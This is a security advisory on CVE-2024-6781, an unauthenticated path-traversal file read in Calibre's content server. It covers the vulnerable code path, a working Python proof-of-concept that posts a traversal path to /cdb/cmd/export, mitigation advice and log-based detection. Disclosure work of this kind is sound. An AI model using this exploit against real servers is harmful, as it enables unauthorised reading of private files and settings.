## Product Overview[#](#product-overview)

Calibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.

Calibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time.

## Vulnerability Summary[#](#vulnerability-summary)

Arbitrary file read via Calibre’s content server in Calibre <= 7.14.0.

## Vulnerability Details[#](#vulnerability-details)

The source of the vulnerability is in `cmd_export.py`, that is called by the `cdb.py` router. The router imports a secondary module (in the format `cmd_*.py`) based on the incoming HTTP request’s path. In this case, a request to `/cdb/cmd/export` will result in the file `cmd_export.py` being imported and its `implementation()` function will be executed. Additionally, the request body’s content is used as `*args`.

> The list of `cmd_*.py` files can be obtained from the `src/calibre/db/cli/` directory.

```
# src/calibre/srv/cdb.py#L28
@endpoint('/cdb/cmd/{which}/{version=0}', postprocess=msgpack_or_json, methods=receive_data_methods, cache_control='no-cache')
def cdb_run(ctx, rd, which, version):
    try:
        m = module_for_cmd(which)
    except ImportError:
        raise HTTPNotFound(f'No module named: {which}')
    if not getattr(m, 'readonly', False): # [1]
        ctx.check_for_write_access(rd)
    [...snip...]
    try:
        result = m.implementation(db, partial(ctx.notify_changes, db.backend.library_path), *args) # [2]

```

The vulnerable function is located at `cmd_export.py::implementation()`, so at [1], if the `readonly` module variable is `False` or absent, the function `check_for_write_access()` would not trigger and code execution can continue. The `implementation()` function of `cmd_export.py` module is then executed with user-controlled arguments `*args` at [2].

```
# src/calibre/db/cli/cmd_export.py#L17
readonly = True
[...snip...]
def implementation(db, notify_changes, action, *args):
 [...snip..]
    if action == 'extra_file':
        book_id, relpath, dest = args # args parameter is sourced from request payload sequentially
        if is_remote:
            from io import BytesIO
            output = BytesIO()
            db.copy_extra_file_to(book_id, relpath, output) # [3]
            return output.getvalue()
        db.copy_extra_file_to(book_id, relpath, dest)

```

The function `db.copy_extra_file_to()` at [3], shown below, builds a relative path from the pre-configured library path, reads the file content, then stores its content into the `output` variable. The `output` BytesIO variable is subsequently returned to the user. Since there were no input sanitisation performed on the user-supplied arguments, this results in an arbitrary file read vulnerability.

```
# src/calibre/db/backend.py#L2005
def copy_extra_file_to(self, book_id, book_path, relpath, stream_or_path):
    full_book_path = os.path.abspath(os.path.join(self.library_path, book_path))
    src_path = make_long_path_useable(os.path.join(full_book_path, relpath))
    if isinstance(stream_or_path, str):
        shutil.copy2(src_path, make_long_path_useable(stream_or_path))
    else:
        with open(src_path, 'rb') as src:
            shutil.copyfileobj(src, stream_or_path)

```
## Exploit Conditions[#](#exploit-conditions)

This vulnerability can be exploited by an unauthenticated attacker with the default configuration of Calibre’s content server which has basic authentication disabled by default, or by any privileged authenticated attacker.

Additionally, the file must be UTF-8 compatible.

## Proof-of-Concept[#](#proof-of-concept)

We have tried our best to make the PoC as portable and cross-platform as possible. This report includes a functional exploit written in Python3 that automatically performs the arbitrary file read.

A sample exploit script is shown below:

```
#! /usr/bin/env python3
# PoC for: CVE-2024-6781
# Description: Unauthenticated arbitrary file read in calibre <= 7.14.0
# Written by: Amos Ng (@LFlare)
import json
import sys
import requests
_target = "http://localhost:8080" # SET ME
_book_id = 1 # ensure book_id exists
def exploit(path):
    r = requests.post(
        f"{_target}/cdb/cmd/export",
        headers={"Content-Type": "application/json"},
        json=["extra_file", _book_id, path, ""],
    )
    try:
        print(r.json()["result"])
    except Exception:
        print(r.text)
if __name__ == "__main__":
    exploit("..\\..\\..\\Calibre Settings\\gui.json")

```

## Suggested Mitigations[#](#suggested-mitigations)

Ensure that user-supplied input are properly sanitised to prevent path traversals.

## Detection Guidance[#](#detection-guidance)

It is possible to detect potential exploitation of the vulnerability by checking the server’s access logs for POST requests to the `/cdb/cmd/export` endpoint.
